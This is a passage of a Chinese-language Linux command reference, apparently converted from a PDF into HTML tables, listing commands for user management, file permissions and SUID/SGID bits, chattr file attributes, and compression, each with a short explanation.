</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # newgrp - [group]
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    登陆进一个新的群组以改变新创建文件的预设群组
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # passwd
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    修改口令
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # passwd user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    修改一个用户的口令<span class="s52">(</span>只允许 <span class="s52">root </span>执行<span class="s52">)</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # pwck
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    检查 <span class="s52">&#39;/etc/passwd&#39; </span>的文件格式和语法修正以及存在的用户
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # useradd -c &quot;User Linux&quot; -g admin -d

/home/user1 -s /bin/bash user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个属于<span class="s52">&quot;admin&quot; </span>用户组的用户
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # useradd user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个新用户
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # userdel -r user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除一个用户<span class="s52">( &#39;-r&#39; </span>排除主目录<span class="s52">)</span>
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # usermod -c &quot;User FTP&quot; -g system -d

/ftp/user1 -s /bin/nologin user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    修改用户属性
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark48">文件的权限</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chgrp group1 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    改变文件的群组
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod ugo+rwx directory1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置目录的所有人<span class="s52">(u)</span>、群组<span class="s52">(g)</span>以及其他人

(o)<span class="s33">以读（</span>r <span class="s33">）、写</span>(w)<span class="s33">和执行</span>(x)<span class="s33">的权限</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod go-rwx directory1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除群组<span class="s52">(g)</span>与其他人<span class="s52">(o)</span>对目录的读写执行权限
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod u+s /bin/file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置一个二进制文件的 <span class="s52">SUID </span>位<span class="s52">- </span>运行该文件的用户也被赋予和所有者同样的权限
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod u-s /bin/file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    禁用一个二进制文件的 <span class="s52">SUID </span>位
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod g+s /home/public
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置一个目录的 <span class="s52">SGID </span>位<span class="s52">- </span>类似 <span class="s52">SUID </span>，不过这是针对目录的
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod g-s /home/public
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    禁用一个目录的 <span class="s52">SGID </span>位
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod o+t /home/public
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置一个文件的<span class="s52">STIKY </span>位<span class="s52">- </span>只允许合法所有人删除文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chmod o-t /home/public
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    禁用一个目录的<span class="s52">STIKY </span>位
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chown user1 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    改变一个文件的所有人属性
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chown -R user1 directory1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    改变一个目录的所有人属性并同时改变改目录下所有文件的属性
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chown user1:group1 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    改变一个文件的所有人和群组属性
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find / -perm -u+s
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列一个系统中所有使用了 <span class="s52">SUID </span>控制的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls -lh
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示权限
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls /tmp | pr -T5 -W$COLUMNS
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将终端划分成 <span class="s52">5 </span>栏显示
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark49">文件的特殊属性</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +a file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    只允许以追加方式读写文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +c file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    允许这个文件能被内核自动压缩<span class="s52">/</span>解压
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +d file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在进行文件系统备份时，<span class="s52">dump </span>程序将忽略这个文件
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +i file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置成不可变的文件，不能被删除、修改、重命名或者链接
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +s file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    允许一个文件被安全地删除
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +S file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    一旦应用程序对这个文件执行了写操作， 使系统立刻把修改的结果写到磁盘
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chattr +u file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    若文件被删除，系统会允许你在以后恢复这个被删除的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lsattr
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示特殊的属性
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark50">打包和压缩文件</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # bunzip2 file1.bz2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压一个叫做<span class="s52">&#39;file1.bz2&#39;</span>的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # bzip2 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    压缩一个叫做<span class="s52">&#39;file1&#39; </span>的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # gunzip file1.gz
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压一个叫做<span class="s52">&#39;file1.gz&#39;</span>的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # gzip file1
